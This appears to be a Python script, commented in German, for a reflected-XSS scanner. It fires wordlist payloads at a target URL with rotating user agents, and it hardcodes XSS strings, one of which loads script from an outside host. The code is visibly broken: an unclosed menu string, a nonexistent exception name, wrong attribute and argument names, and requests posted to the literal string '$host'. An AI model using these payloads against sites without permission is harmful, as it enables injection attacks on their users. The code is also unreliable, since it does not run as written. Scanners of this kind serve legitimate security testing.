#!/usr/bin/env python3


#Hier werden alle Bibliotheken angegeben, die für das Programm benötigt und importiert werden
import requests
import argparse
import sys
import logging
import random
import entry
from time import sleep




class bcolors:
    CBLUE = '\33[34m'
    CRED = '\33[31m'



def Menu():
    while True:
        print("XSS-TESTER")
        yy = ("\n"
              "1) BASIC PAYLOAD TESTSTRINGS\n"
              "2) WORDLIST WFUZZ XSS\n"
              "3) ENTER FILE PATH\n "
              "4) EXIT\n"
              "\n"

















#Funktion XSS Finder User Agents für die User Agents Eingabe im Programm ausgewählt aus der Liste (useragent.txt)
def get_user_agent():
    try:
        lines = [line.rstrip("\n") for line in open("useragent.txt")]
    except IDError as e:
        print("User Agent error: %s" % e.strerror)
        sys.exit(1)
    return lines









#Funktion XSS Finder Auswahl für die Standartliste, XSS Infections wfuzz Wordlist oder eine selbsterstellte Liste

def xss_finder():
   try:
       print(bcolors.CBLUE,"e.g target ->>>> http://target.com/submit.php?name=")
       url = input("Please Enter Target URL\t:")
       print(bcolors.CBLUE,"Default Payload List ->>>> xss_teststrings02.txt")
       y = """
       1) BASIC PAYLOAD TESTSTRINGS
       2) WORDLIST WFUZZ XSS
       3) ENTER FILE PATH
       4) EXIT
       """
       print(y)
       choice = input("->>>>Please Choose Payload List\t:")
       if choice == '1':
           print("Selected Payload payload:xss_teststrings02.txt\n")
           choice = "xss_teststrings.txt"
       elif choice == '2':
           print("Selected Payload payload: /usr/share/wordlists/wfuzz/Injections/XSS.txt")
           choice = input("Path enter\t:")
       elif choice == '3':
           print("Selected Payload payload: /PATH/TO/YOUR/PAYLOAD/XSS.txt")
           choice = input("Path enter\t:")
       elif choice == '4':
           print("Exiting....")
           sys.exit()
       else:
           print("Wrong Choice...")
           choice = choice.replace("\\", "/")
       while True:
           with open(choice, "r", errors="replace") as f:
               for i in f:
                   try:
                       usrr = get_user_agent()
                       header = {"User-Agent": "{}".format(random.choice(usrr))}
                       req = requests.get(url + i, headers=header)
                       if i in req.txt:
                           print(bcolors.CRED,"Parameter vulnerable\r\n")
                           print(bcolors.CRED,"Vulnerable Payload Found\t: " + req.url)
                           with open("vulnpayload.txt", "a+") as ss:
                               ss.write(i)

                       else:
                           print(bcolors.CBLUE,"Trying\t:", req.url)
                   except:
                       pass
               break


   except Exception as err:
        print(err)




Menu()









#Einleseprozess
#Parameterliste und Eingabeparser für die Initialdaten
parser = argparse.ArgumentParser(
    description="XSS Scanner, for the testing of Reflected XSS Vulnerabilities in Websites"
)

parser.add_argument(
    "-u", "--url", dest='target', help="Host to perform the test on"
)

parser.add_argument(
    "-f", "--file", dest='args_file', help="Load the Payloads from a file"
)

args = parser.parse_args()






#Exceptionhandling
#wenn zu wenig argumente ausgewählt werden bricht das Programm ab und gibt die Help Parameter aus
if len(sys.argv) <= 1:
    parser.print_help()
    sys.exit(1)

if not args.host:
    print("Host required!")
    parser.print_help()
    sys.exit(1)

if not args.field:
    print("Field required!")
    parser.print_help()
    sys.exit(1)








#Datatype List. Dies sind die Teststrings die ausgeführt werden, um die XSS Schwachstelle zu testen
list_of_strings = []
xss_strings = [
    '<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>',
    '</TITLE><SCRIPT>alert("XSS");</SCRIPT>',
]






#Einlesen der xss_teststring datei


request = requests.post('$host', data = {'field1':'name'})

payload = {'field1': 'name', 'field2': 'street'}
request = requests.post('$host', params = payload)